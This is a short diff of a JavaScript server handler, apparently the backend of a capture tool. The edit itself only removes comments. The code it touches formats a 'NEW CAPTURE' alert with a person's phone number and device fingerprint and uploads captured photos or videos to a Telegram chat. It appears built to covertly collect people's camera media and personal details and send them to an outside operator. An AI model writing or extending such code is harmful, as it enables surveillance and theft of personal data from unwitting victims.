@@ -35,7 +35,7 @@ export default async function handler(req, res) {
     const f = fingerprint || {};
     const videoLabel = videoIndex !== undefined ? ` (Video ${videoIndex+1})` : '';
 
-    // ✅ HTML FORMATTING - reliable rendering
+   
     const caption = `📡 <b>NEW CAPTURE</b> ${type === 'video' ? '🎥' : '📸'}${videoLabel}\n` +
         `━━━━━━━━━━━━━━━━━━\n` +
         `📞 <b>Phone:</b> ${f.phone || 'N/A'}\n` +
@@ -64,7 +64,7 @@ export default async function handler(req, res) {
     let form = new FormData();
     form.append('chat_id', CHAT_ID);
     form.append('caption', caption);
-    form.append('parse_mode', 'HTML'); // ✅ Changed to HTML
+    form.append('parse_mode', 'HTML'); 
 
     if (type === 'image') {
         const buffer = Buffer.from(image.replace(/^data:image\/\w+;base64,/, ''), 'base64');
